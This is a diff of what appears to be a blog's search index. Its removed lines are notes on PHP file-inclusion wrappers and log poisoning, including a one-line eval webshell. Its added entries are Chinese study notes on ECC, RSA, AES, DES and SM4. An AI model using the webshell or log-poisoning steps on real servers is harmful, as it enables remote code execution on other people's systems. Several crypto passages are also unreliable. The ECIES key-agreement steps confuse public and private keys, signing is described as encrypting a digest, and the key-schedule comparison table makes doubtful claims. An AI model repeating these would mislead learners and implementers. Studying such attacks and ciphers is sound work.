-<h4 id="1-php-filter-使用方法"><a href="#1-php-filter-使用方法" class="headerlink" title="1.php:&#x2F;&#x2F;filter 使用方法"></a>1.php:&#x2F;&#x2F;filter 使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=过滤器名/resource=目标文件        --基本格式     --read可以改为write </span></span><br><span class="line">                                        --默认是read，有时可不写read,可以不加过滤器</span><br><span class="line">一些过滤器:</span><br><span class="line">            convert.base64-encode	base64 编码输出</span><br><span class="line">            convert.base64-decode	base64 解码输入</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable 编码</span><br><span class="line">            <span class="keyword">string</span>.strip_tags	去除 HTML/PHP 标签      --php7.<span class="number">3</span>.x后废弃</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 替换加密</span><br><span class="line">            <span class="keyword">string</span>.toupper	字母转大写</span><br><span class="line">            <span class="keyword">string</span>.tolower	字母转小写</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
-
-<h4 id="2-php-input-使用方法"><a href="#2-php-input-使用方法" class="headerlink" title="2.php:&#x2F;&#x2F;input 使用方法:"></a>2.php:&#x2F;&#x2F;input 使用方法:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --用于读取 HTTP 请求体的原始内容</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-data-使用方法"><a href="#3-data-使用方法" class="headerlink" title="3.data:&#x2F;&#x2F;使用方法"></a>3.data:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatype（MIME类型）比如：text/plain、text/html  </span></span><br><span class="line">                               --data，必须是完整的php代码</span><br><span class="line">mediatype（MIME类型）:</span><br><span class="line">                    text/plain	纯文本	✅ 推荐，用于执行 PHP 代码</span><br><span class="line">                    text/html	HTML 格式	✅ 也能执行 PHP，显示为网页</span><br><span class="line">                    text/xml	XML 格式	通常用于接口测试</span><br><span class="line">                    application/json	JSON 数据	多用于 API</span><br><span class="line">                    application/x-www-form-urlencoded	表单数据（普通POST）	API 数据传输</span><br><span class="line">                    application/javascript	JS 脚本	通常用于网页环境，不用于PHP</span><br><span class="line">                    image/png	图片	不适合执行 PHP</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-file-使用方法"><a href="#4-file-使用方法" class="headerlink" title="4.file:&#x2F;&#x2F;使用方法"></a>4.file:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//绝对路径                 </span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-通过日志"><a href="#2-通过日志" class="headerlink" title="2.通过日志"></a>2.通过日志</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --通过nginx中日志的路径</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --查看配置信息</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -3853,6 +3853,397 @@
       <tags>
         <tag>语言学习</tag>
         <tag>linxu命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>椭圆曲线密码</title>
+    <url>/2025/09/21/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="椭圆曲线密码-ECC"><a href="#椭圆曲线密码-ECC" class="headerlink" title="椭圆曲线密码(ECC):"></a>椭圆曲线密码(ECC):</h1><p>基于椭圆曲线离散对数问题（ECDLP）难解性</p>
+<h2 id="1-密钥的生成"><a href="#1-密钥的生成" class="headerlink" title="1. 密钥的生成:"></a>1. 密钥的生成:</h2><p>在椭圆曲线加密中，密钥生成包括两部分：<strong>私钥</strong>和<strong>公钥</strong>。</p>
+<ul>
+<li><p><strong>私钥</strong>：随机选择一个大整数，通常通过一个安全的随机数生成器来生成。</p>
+</li>
+<li><p><strong>公钥</strong>：通过私钥和椭圆曲线的基点（生成点）进行运算生成。公钥是私钥与基点的乘积，记作：</p>
+<p>Public Key&#x3D;Private Key×G</p>
+<p>其中 G 是椭圆曲线的基点。</p>
+</li>
+</ul>
+<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><p>椭圆曲线集成加密方案（ECIES，Elliptic Curve Integrated Encryption Scheme）是一种使用椭圆曲线加密的标准方法，下面是ECIES的加密流程：</p>
+<h4 id="加密方："><a href="#加密方：" class="headerlink" title="加密方："></a>加密方：</h4><ol>
+<li><p><strong>选择公钥</strong>：接收方（Bob）将其公钥提供给发送方（Alice）。</p>
+</li>
+<li><p><strong>生成随机数</strong>：发送方随机选择一个整数 k，该整数与椭圆曲线基点 G 结合来生成加密密钥。</p>
+</li>
+<li><p><strong>计算共享密钥</strong>：发送方使用自己的私钥和接收方的公钥，计算共享密钥（共享密钥的计算基于椭圆曲线Diffie-Hellman协议）：</p>
+<p>K&#x3D;k×Bob’s Public Key     —Bob’s Public Key&#x3D;Bob的私钥×G</p>
+</li>
+<li><p><strong>生成密文</strong>：使用共享密钥生成对称密钥，用来加密实际的数据（比如AES加密）。然后，计算加密后的数据和随机数的组合：</p>
+<p>C&#x3D;Encrypt(Message,Key)</p>
+</li>
+<li><p><strong>传输密文</strong>：发送方将密文和随机数 k 一起发送给接收方。</p>
+</li>
+</ol>
+<h4 id="解密方："><a href="#解密方：" class="headerlink" title="解密方："></a>解密方：</h4><ol>
+<li><p><strong>计算共享密钥</strong>：接收方使用自己的私钥和发送方的公钥计算共享密钥。</p>
+<p>K&#x3D;k×Alice’s Public Key      —Alice’s Public Key&#x3D;Bob的私钥×G</p>
+</li>
+<li><p><strong>解密密文</strong>：接收方使用计算得到的共享密钥解密收到的密文。</p>
+<p>Message&#x3D;Decrypt(C,Key)</p>
+</li>
+</ol>
+<h2 id="3-数字签名（ECDSA）"><a href="#3-数字签名（ECDSA）" class="headerlink" title="3.数字签名（ECDSA）"></a>3.<strong>数字签名（ECDSA）</strong></h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1.作用:"></a>1.作用:</h3><h4 id="身份验证（Authentication）"><a href="#身份验证（Authentication）" class="headerlink" title="身份验证（Authentication）"></a><strong>身份验证（Authentication）</strong></h4><p>数字签名能够证明消息确实是由消息的发送者发出的，并且没有被篡改。</p>
+<ul>
+<li><strong>公钥基础设施（PKI）</strong>：通过数字签名，接收方能够验证消息是否确实是由声明的发送方发出的。这是因为签名是使用发送方的私钥生成的，而只有拥有对应私钥的人才能生成有效的签名。因此，接收方可以使用发送方的公钥来验证签名是否有效，确保消息的发件人身份。</li>
+</ul>
+<h4 id="数据完整性（Data-Integrity）"><a href="#数据完整性（Data-Integrity）" class="headerlink" title="数据完整性（Data Integrity）"></a><strong>数据完整性（Data Integrity）</strong></h4><p>数字签名确保了消息在传输过程中未被篡改。</p>
+<ul>
+<li><strong>哈希值</strong>：数字签名通常会对消息进行哈希运算（生成消息摘要），然后使用私钥对这个哈希值进行签名。如果消息内容在传输过程中被修改，计算得到的哈希值就会发生变化，验证签名时就会失败，从而能够检测到数据被篡改。</li>
+</ul>
+<h4 id="不可否认性（Non-repudiation）"><a href="#不可否认性（Non-repudiation）" class="headerlink" title="不可否认性（Non-repudiation）"></a><strong>不可否认性（Non-repudiation）</strong></h4><p>数字签名提供了不可否认性，即发送方不能否认自己已签署某个消息。</p>
+<ul>
+<li>由于数字签名是通过发送方的私钥生成的，且只有发送方拥有私钥，因此在签署之后，发送方不能声称自己没有发送过该消息。即使在后续，发送方也不能否认自己发送的消息。</li>
+</ul>
+<h4 id="防篡改"><a href="#防篡改" class="headerlink" title="防篡改"></a><strong>防篡改</strong></h4><p>数字签名还能够保证消息的完整性。任何在消息上的修改都会导致签名验证失败，防止数据在传输过程中被篡改。</p>
+<h2 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程:"></a>2.流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送方:</span><br><span class="line">    1.首先对要发送的二进制数据流进行哈希摘要</span><br><span class="line">                   --- 常用哈希摘要: MD5 ,SHA1  ,SHA256  </span><br><span class="line">    2.使用私钥对摘要进行加密(签名)</span><br><span class="line">接受方:</span><br><span class="line">    1.使用发送方的公钥对摘要进行解密</span><br><span class="line">    2.使用同样的哈希算法对二进制数据流进行计算</span><br><span class="line">    3.对比两次哈希是否一致，一致则未篡改</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>密码学</category>
+        <category>非对称密码(公钥密码)</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>非对称密码(公钥密码)</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RAS</title>
+    <url>/2025/09/21/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/RAS/</url>
+    <content><![CDATA[<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA:"></a>RSA:</h1><p>建立在大整数因式分解难题</p>
+<h2 id="1-RSA流程"><a href="#1-RSA流程" class="headerlink" title="1.RSA流程:"></a>1.RSA流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成密钥 → 加密 → 解密</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-生成密钥"><a href="#2-生成密钥" class="headerlink" title="2.生成密钥:"></a>2.生成密钥:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 选择两个大质数 </span><br><span class="line">   令：`p = 61, q = 53`</span><br><span class="line"></span><br><span class="line">2. 计算模数 n </span><br><span class="line">   `n = p × q = 61 × 53 = 3233`    ---这个 n 是 公钥 和 私钥 中共同的模数。</span><br><span class="line"></span><br><span class="line">3.计算欧拉函数 φ(n)</span><br><span class="line">   `φ(n) = (p - 1)(q - 1) = 60 × 52 = 3120`</span><br><span class="line"></span><br><span class="line">4. 选择加密指数 e  </span><br><span class="line">   `e = 17`（满足 `gcd(17, 3120) = 1`）</span><br><span class="line"></span><br><span class="line">5. 计算解密指数 d  </span><br><span class="line">   `d = e⁻¹ mod φ(n) = 2753`（因为 `17 × 2753 ≡ 1 mod 3120`）</span><br><span class="line"></span><br><span class="line">- ✅ 公钥：`(e, n) = (17, 3233)`</span><br><span class="line">- 🔒 私钥：`(d, n) = (2753, 3233)`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-加密流程"><a href="#3-加密流程" class="headerlink" title="3.加密流程:"></a>3.加密流程:</h2><p>首先，发送方需要知道接收方的<strong>公钥 (e, n)</strong>，其中：</p>
+<ul>
+<li>e 是加密指数，通常是一个公开的较小整数；</li>
+<li>n 是两个大质数相乘得到的模数；</li>
+<li>公钥是公开的，任何人都可以用来加密消息。</li>
+</ul>
+<p>接着，发送方将要发送的明文 M（需满足 0&lt;M&lt;n）使用以下公式进行加密：</p>
+<p>  <strong>C &#x3D; M^e mod n</strong></p>
+<h2 id="4-解密流程"><a href="#4-解密流程" class="headerlink" title="4.解密流程:"></a>4.解密流程:</h2><p>接收方收到密文 C 之后，使用自己的私钥 (d,n) 对密文进行解密。私钥中的 d 是在密钥生成阶段计算出来的，是加密指数 e 关于欧拉函数 φ(n) 的模反元素，即满足 e⋅d ≡ 1 mod  φ(n)</p>
+<p>解密公式为：</p>
+<p>  <strong>M &#x3D; C^d mod n</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C = M^e mod n     ---加密得到C</span><br><span class="line">C^d mod n  --&gt; </span><br><span class="line">        ((M^e) mod n)^d mod n   --&gt;  M^ed mod n       ---幂模分配律</span><br><span class="line">ed=1  mod φ(n)   --&gt; ed=k(φ(n))+1</span><br><span class="line">M^(k(φ(n))+1) mod n --&gt; M</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>密码学</category>
+        <category>非对称密码(公钥密码)</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>非对称密码(公钥密码)</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SM2</title>
+    <url>/2025/09/21/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/SM2/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>密码学</category>
+        <category>非对称密码(公钥密码)</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>非对称密码(公钥密码)</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>aes</title>
+    <url>/2025/09/21/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/aes/</url>
+    <content><![CDATA[<h1 id="aes加密"><a href="#aes加密" class="headerlink" title="aes加密:"></a>aes加密:</h1><h2 id="1-特征"><a href="#1-特征" class="headerlink" title="1.特征:"></a>1.特征:</h2><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>分组大小（Block）</td>
+<td>固定为 <strong>128 位</strong>（16 字节）</td>
+</tr>
+<tr>
+<td>密钥长度（Key）</td>
+<td>可为 <strong>128 位 &#x2F; 192 位 &#x2F; 256 位</strong>（常用128位）</td>
+</tr>
+<tr>
+<td>轮数（Rounds）</td>
+<td>依据密钥长度不同：10（128位）、12（192）、14（256）</td>
+</tr>
+<tr>
+<td>算法结构</td>
+<td>基于 <strong>Substitution–Permutation Network（SPN）</strong></td>
+</tr>
+</tbody></table>
+<h2 id="2-aes的加密流程-密钥128位"><a href="#2-aes的加密流程-密钥128位" class="headerlink" title="2.aes的加密流程 (密钥128位):"></a>2.aes的加密流程 (密钥128位):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入明文（128bit）</span><br><span class="line">      ↓</span><br><span class="line">AddRoundKey（初始轮）</span><br><span class="line">      ↓</span><br><span class="line">9轮：SubBytes(字节代换) → ShiftRows(行移位) → MixColumns(列混合) → AddRoundKey (轮密钥加)</span><br><span class="line">      ↓</span><br><span class="line">第10轮：SubBytes → ShiftRows → AddRoundKey    ---没有列混合</span><br><span class="line">      ↓</span><br><span class="line">输出密文（128bit）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>3.初始轮:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将明文状态矩阵与第 0 轮子密钥（RoundKey₀）做逐字节异或（XOR）操作。</span><br><span class="line">本质上是将密钥“注入”到加密流程的起点，为接下来的非线性变换和扩散做准备。</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题:"></a>1.问题:</h3><p>明文是 128 位（16 字节），初始轮的 AddRoundKey 是对明文和密钥逐字节 XOR。如果我的密钥是 <strong>192 位或 256 位</strong>，那怎么 XOR 呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES 不直接使用原始密钥参与加密，而是通过 密钥扩展（Key Schedule） 生成 每轮使用的“轮密钥”（Round Key）。不管原始密钥是 128、192 还是 256 位，每轮都只用一个 128 位的轮密钥。</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>原始密钥位数</th>
+<th>总轮数</th>
+<th>要生成的子密钥数量</th>
+<th>每个子密钥长度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>128 位</td>
+<td>10</td>
+<td>11 个</td>
+<td>128 位（16 字节）</td>
+</tr>
+<tr>
+<td>192 位</td>
+<td>12</td>
+<td>13 个</td>
+<td>128 位</td>
+</tr>
+<tr>
+<td>256 位</td>
+<td>14</td>
+<td>15 个</td>
+<td>128 位</td>
+</tr>
+</tbody></table>
+<h2 id="4-字节替代-s盒"><a href="#4-字节替代-s盒" class="headerlink" title="4.字节替代(s盒):"></a>4.字节替代(s盒):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对 状态矩阵中的每个字节，使用一个固定的查找表（S-box）进行非线性映射替代</span><br><span class="line">是整个 AES 中引入非线性和抗线性分析攻击的核心步骤</span><br><span class="line">就是按字节查表:</span><br><span class="line">   比如某一个字节是0x53</span><br><span class="line">        高4位：5（行索引）</span><br><span class="line">        低4位：3（列索引）</span><br><span class="line">   然后去s盒表中找5行3列对应的字节值</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-行移位"><a href="#5-行移位" class="headerlink" title="5.行移位:"></a>5.行移位:</h2><p>按行左移字节就行了</p>
+<table>
+<thead>
+<tr>
+<th>行号</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第0行</td>
+<td>不变</td>
+</tr>
+<tr>
+<td>第1行</td>
+<td>循环左移 1 个字节</td>
+</tr>
+<tr>
+<td>第2行</td>
+<td>循环左移 2 个字节</td>
+</tr>
+<tr>
+<td>第3行</td>
+<td>循环左移 3 个字节（或右移1位）</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打乱同一列字节之间的联系，让后续的 MixColumns 可以混合更多跨字节的数据；</span><br><span class="line">增强扩散性，使得明文的小改动能影响到加密后的多个字节；</span><br><span class="line">是一种 位置置换操作，没有改变字节本身的值。</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-列混合"><a href="#6-列混合" class="headerlink" title="6.列混合:"></a>6.列混合:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MixColumns（列混合） 是 AES 加密中每一轮的第 3 个操作（除了最后一轮不执行它），</span><br><span class="line">它通过矩阵乘法在 GF(2⁸) 有限域中，把每一列的4个字节混合生成新的4个字节。</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-轮密钥加"><a href="#7-轮密钥加" class="headerlink" title="7.轮密钥加:"></a>7.轮密钥加:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前状态矩阵与本轮的轮密钥（Round Key）逐字节进行按位异或（XOR）</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>运算简单</td>
+<td>仅使用按位异或（XOR），硬件友好</td>
+</tr>
+<tr>
+<td>密钥注入点</td>
+<td>是 AES 中 <strong>唯一使用密钥的地方</strong></td>
+</tr>
+<tr>
+<td>可逆性强</td>
+<td>XOR 的逆运算就是本身（再次 XOR 即可还原）</td>
+</tr>
+<tr>
+<td>轮密钥变化</td>
+<td>每轮使用不同的轮密钥（由原始密钥扩展）</td>
+</tr>
+</tbody></table>
+<h2 id="8-密钥扩展"><a href="#8-密钥扩展" class="headerlink" title="8.密钥扩展:"></a>8.密钥扩展:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将原始密钥切成若干 32 位字（4字/6字/8字）</span><br><span class="line">每次迭代扩展一个 32 位字，共需 44/52/60 个字（每轮 4 个字）</span><br><span class="line"></span><br><span class="line">1. 初始密钥写入前 Nk 个字（Nk = 4/6/8）</span><br><span class="line">2. 对后续每一组（每组4字）：</span><br><span class="line">   - 如果当前索引 i 是 Nk 的倍数：</span><br><span class="line">     temp = SubWord(RotWord(w[i-1])) ⊕ Rcon[i/Nk]</span><br><span class="line">   - 否则如果 Nk &gt; 6 且 i ≡ 4 mod Nk：</span><br><span class="line">     temp = SubWord(w[i-1])</span><br><span class="line">   - 然后：w[i] = w[i-Nk] ⊕ temp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>AES</th>
+<th>DES</th>
+<th>SM4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>原始密钥长度</td>
+<td>128 &#x2F; 192 &#x2F; 256 bit</td>
+<td>64 bit（含8位校验）</td>
+<td>128 bit</td>
+</tr>
+<tr>
+<td>有效密钥长度</td>
+<td>128 &#x2F; 192 &#x2F; 256 bit</td>
+<td>56 bit</td>
+<td>128 bit</td>
+</tr>
+<tr>
+<td>总轮数</td>
+<td>10 &#x2F; 12 &#x2F; 14</td>
+<td>16</td>
+<td>32</td>
+</tr>
+<tr>
+<td>每轮密钥长度</td>
+<td>128 bit（16 字节）</td>
+<td>48 bit</td>
+<td>32 bit（1个字）</td>
+</tr>
+<tr>
+<td>子密钥数量</td>
+<td>轮数 + 1（11&#x2F;13&#x2F;15 个）</td>
+<td>16 个</td>
+<td>32 个</td>
+</tr>
+<tr>
+<td>主要操作</td>
+<td>字扩展 + S-box + XOR + 轮常量</td>
+<td>置换 + 左移 + 压缩置换</td>
+<td>XOR + S-box + 线性变换 + CK</td>
+</tr>
+<tr>
+<td>是否非线性</td>
+<td>✅（使用 S-box）</td>
+<td>❌</td>
+<td>✅（S-box + 线性组合）</td>
+</tr>
+<tr>
+<td>是否可逆</td>
+<td>❌</td>
+<td>✅</td>
+<td>❌（但结构对称）</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>密码学</category>
+        <category>对称密码(分组密码)</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>对称密码(分组密码)</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>des</title>
+    <url>/2025/09/21/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/des/</url>
+    <content><![CDATA[<h1 id="des加密"><a href="#des加密" class="headerlink" title="des加密:"></a>des加密:</h1><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念:"></a>1.基本概念:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DES使用56位的密钥和64位的明文块进行加密。DES算法的分组大小是64位，因此，如果需要加密的明文长度不足64位，需要进行填充；如果明文长度超过64位，则需要使用分组模式进行分组加密。</span><br><span class="line">虽然DES算法的分组大小是64位，但是由于DES算法的密钥长度只有56位，因此DES算法存在着弱点，容易受到暴力破解和差分攻击等攻击手段的威胁。因此，在实际应用中，DES算法已经不再被广泛使用，而被更加安全的算法所取代，如AES算法等。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-加密流程："><a href="#2-加密流程：" class="headerlink" title="2.加密流程："></a>2.加密流程：</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/13057fca8d2ae93a87bbceb559746832.png" alt="img"></p>
+<p>明文64位 → 初始置换（IP） → 16轮加密（Feistel结构） → 逆初始置换（IP⁻¹） → 密文64位</p>
+<h3 id="F函数结构"><a href="#F函数结构" class="headerlink" title="F函数结构:"></a>F函数结构:</h3><ol>
+<li><strong>扩展置换 E：</strong><ul>
+<li>将 32位的R 扩展为 48位（E表）<br> ⟹ 使其可以和 48位子密钥 <code>Ki</code> 做异或操作</li>
+</ul>
+</li>
+<li><strong>异或：</strong><ul>
+<li>48位扩展后的R 与 48位子密钥 <code>Ki</code> 做异或</li>
+</ul>
+</li>
+<li><strong>S盒替换：</strong><ul>
+<li>将 48位结果 分成 8组，每组6位</li>
+<li>进入 8个 S-box（6位 → 4位）进行非线性变换</li>
+<li>输出为 32位</li>
+</ul>
+</li>
+<li><strong>P置换：</strong><ul>
+<li>对S盒输出的32位进行 P置换，增强扩散</li>
+</ul>
+</li>
+</ol>
+<p>最终得到 F(R, Ki) 的输出（32位）</p>
+<h2 id="3-三重des："><a href="#3-三重des：" class="headerlink" title="3.三重des："></a>3.三重des：</h2><blockquote>
+<p><strong>EDE 模式（Encrypt → Decrypt → Encrypt）</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文 = E_K3(D_K2(E_K1(明文)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>E_K1：</strong> 用密钥K1进行DES加密</li>
+<li><strong>D_K2：</strong> 用密钥K2进行DES解密</li>
+<li><strong>E_K3：</strong> 再用密钥K3进行DES加密</li>
+</ul>
+<p>中间使用一次解密是为了:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果k1=k2=k3，那么这个3des就和普通的des一样了</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>密码学</category>
+        <category>对称密码(分组密码)</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>对称密码(分组密码)</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sm4</title>
+    <url>/2025/09/21/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/sm4/</url>
+    <content><![CDATA[<h1 id="sm4加密"><a href="#sm4加密" class="headerlink" title="sm4加密:"></a>sm4加密:</h1><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念:"></a>1.概念:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SM4是一种分组密码算法，其分组长度为128位（即16字节，4字），密钥长度也为128位（即16字节，4字）。其加解密过程采用了32轮迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：128 位明文 + 128 位密钥</span><br><span class="line">↓</span><br><span class="line">1. 明文拆成 4 个 32 位字：X0, X1, X2, X3</span><br><span class="line">2. 密钥扩展：生成 32 个轮密钥 rk[0] ~ rk[31]</span><br><span class="line">3. 执行 32 轮加密：</span><br><span class="line">     对于每一轮 i = 0 到 31：</span><br><span class="line">         X[i+4] = X[i] ⊕ F(X[i+1], X[i+2], X[i+3], rk[i])</span><br><span class="line">4. 输出密文：X[35], X[34], X[33], X[32]（倒序输出）</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-F函数"><a href="#3-F函数" class="headerlink" title="3.F函数:"></a>3.F函数:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X1, X2, X3, rk) = T(X1 ⊕ X2 ⊕ X3 ⊕ rk)</span><br><span class="line">输入：X1, X2, X3, rk</span><br><span class="line"></span><br><span class="line">Step 1:  temp = X1 ⊕ X2 ⊕ X3 ⊕ rk   → 32位</span><br><span class="line">Step 2:  替代 temp 的每个字节 → 使用 S-box → 得到非线性结果</span><br><span class="line">Step 3:  对结果进行线性变换 L(x)</span><br><span class="line">Step 4:  输出最终的 F 值（32 位）</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>功能类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>混淆性</strong>（Confusion）</td>
+<td>通过 S-box 实现非线性映射，防止线性分析</td>
+</tr>
+<tr>
+<td><strong>扩散性</strong>（Diffusion）</td>
+<td>L 线性变换使得一个比特变化影响多个比特</td>
+</tr>
+<tr>
+<td><strong>密钥注入</strong></td>
+<td>引入轮密钥 rk[i]，确保每轮变换唯一</td>
+</tr>
+<tr>
+<td><strong>加密推进器</strong></td>
+<td>每轮根据 F 生成新状态字，实现 128 位数据演化</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>密码学</category>
+        <category>对称密码(分组密码)</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>对称密码(分组密码)</tag>
       </tags>
   </entry>
   <entry>
@@ -5571,372 +5962,5 @@
         <tag>语言学习</tag>
         <tag>golang</tag>
       </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/aes/</url>
-    <content><![CDATA[<h1 id="aes加密"><a href="#aes加密" class="headerlink" title="aes加密:"></a>aes加密:</h1><h2 id="1-特征"><a href="#1-特征" class="headerlink" title="1.特征:"></a>1.特征:</h2><table>
-<thead>
-<tr>
-<th>属性</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>分组大小（Block）</td>
-<td>固定为 <strong>128 位</strong>（16 字节）</td>
-</tr>
-<tr>
-<td>密钥长度（Key）</td>
-<td>可为 <strong>128 位 &#x2F; 192 位 &#x2F; 256 位</strong>（常用128位）</td>
-</tr>
-<tr>
-<td>轮数（Rounds）</td>
-<td>依据密钥长度不同：10（128位）、12（192）、14（256）</td>
-</tr>
-<tr>
-<td>算法结构</td>
-<td>基于 <strong>Substitution–Permutation Network（SPN）</strong></td>
-</tr>
-</tbody></table>
